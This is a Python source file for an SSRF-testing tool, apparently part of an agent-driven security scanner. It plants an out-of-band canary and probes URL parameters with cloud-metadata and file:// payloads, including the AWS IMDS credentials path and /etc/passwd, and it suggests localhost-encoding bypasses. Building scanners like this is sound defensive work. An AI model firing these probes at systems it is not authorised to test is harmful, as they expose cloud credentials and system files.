"""Server-side request forgery testing, with out-of-band proof.

SSRF is frequently blind: the app fetches your URL but shows you nothing. This
tool proves it two ways — it plants an out-of-band canary and checks whether the
target called home (blind SSRF), and it points the parameter at cloud-metadata
and file:// URLs and looks for the sensitive content coming back (SSRF with a
read). Either is a confirmed, high-severity finding.
"""
from __future__ import annotations

import re
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from proofmark.http_client import Request
from proofmark.tools.base import Tool, ToolResult

# (label, probe url, signature that proves the fetched content came back)
_READ_PROBES = [
    ("aws-imds", "http://169.254.169.254/latest/meta-data/",
     re.compile(r"ami-id|instance-id|iam/security-credentials|placement/|hostname")),
    ("aws-imds-creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     re.compile(r"AccessKeyId|SecretAccessKey|security-credentials")),
    ("file-passwd", "file:///etc/passwd", re.compile(r"root:.*:0:0:")),
    ("gcp", "http://metadata.google.internal/computeMetadata/v1/",
     re.compile(r"computeMetadata|service-accounts")),
]


class SsrfTool(Tool):
    name = "ssrf_test"
    description = (
        "Test a URL parameter for server-side request forgery. Proves it out of band (plants a "
        "canary and checks whether the target fetched it — confirming blind SSRF) and by reading "
        "cloud-metadata / file:// URLs. Give the full url and the parameter that takes a URL "
        "(e.g. ?url=, ?target=, ?webhook=, an image/PDF source). A confirmed hit is high severity."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "Full URL including the URL-valued parameter."},
            "param": {"type": "string", "description": "The parameter that takes a URL."},
            "method": {"type": "string", "description": "HTTP method (default GET)."},
            "where": {"type": "string", "enum": ["query", "body"],
                      "description": "Where the parameter lives (default query)."},
            "body": {"type": "string", "description": "Form body, required when where=body."},
        },
        "required": ["url", "param"],
    }
    returns_untrusted_data = True

    def __init__(self, client, oob=None) -> None:
        self._client = client
        self._oob = oob

    # --- param shaping (query or body) --------------------------------------

    def _set(self, url, param, where, body, value):
        if where == "body":
            pairs = parse_qsl(body or "", keep_blank_values=True)
            if not any(k == param for k, _ in pairs):
                return None
            return url, urlencode([(k, value if k == param else v) for k, v in pairs])
        parts = urlsplit(url)
        pairs = parse_qsl(parts.query, keep_blank_values=True)
        if not any(k == param for k, _ in pairs):
            return None
        return urlunsplit(parts._replace(
            query=urlencode([(k, value if k == param else v) for k, v in pairs]))), body

    def _send(self, method, url, body):
        ok, _text, ex = self._client.send(Request(method, url, {}, body))
        return (ex.status if ex else None), (ex.response_preview if ex else "") or ""

    # --- run ----------------------------------------------------------------

    def run(self, url="", param="", method="GET", where="query", body=None, **_) -> ToolResult:
        method = (method or "GET").upper()
        where = "body" if where == "body" else "query"
        if self._set(url, param, where, body, "probe") is None:
            return ToolResult(
                f"Parameter '{param}' was not found in the {where}. Check the name, or set "
                "where=body and pass the form body.", is_error=True)

        confirmations: list[str] = []

        # 1) blind SSRF via out-of-band canary
        if self._oob is not None:
            token = self._oob.new_canary(f"ssrf {param}")
            canary = self._oob.http_url(token)
            u, b = self._set(url, param, where, body, canary)
            self._send(method, u, b)
            hits = self._oob.interactions(token)
            if hits:
                confirmations.append(
                    f"BLIND SSRF (out-of-band) — the target fetched the canary {canary}: "
                    f"{hits[0].summary()}")

        # 2) SSRF with a read: cloud metadata / local files
        for label, probe, signature in _READ_PROBES:
            u, b = self._set(url, param, where, body, probe)
            status, rbody = self._send(method, u, b)
            m = signature.search(rbody)
            if m:
                snippet = rbody[max(0, m.start() - 15):m.end() + 45].strip().replace("\n", " ")
                confirmations.append(
                    f"SSRF READ ({label}) — {probe} returned sensitive content: …{snippet}…")

        if not confirmations:
            return ToolResult(
                f"No SSRF confirmed on '{param}'. The out-of-band canary was not fetched and "
                "metadata/file probes returned nothing sensitive. It may still be blind with "
                "egress filtering — try other URL shapes (127.0.0.1, [::1], decimal/octal IPs).")
        lines = "\n".join(f"  • {c}" for c in confirmations)
        return ToolResult(
            f"SSRF CONFIRMED on '{param}' (high severity).\n{lines}\n"
            "Record the finding citing the evidence above.")
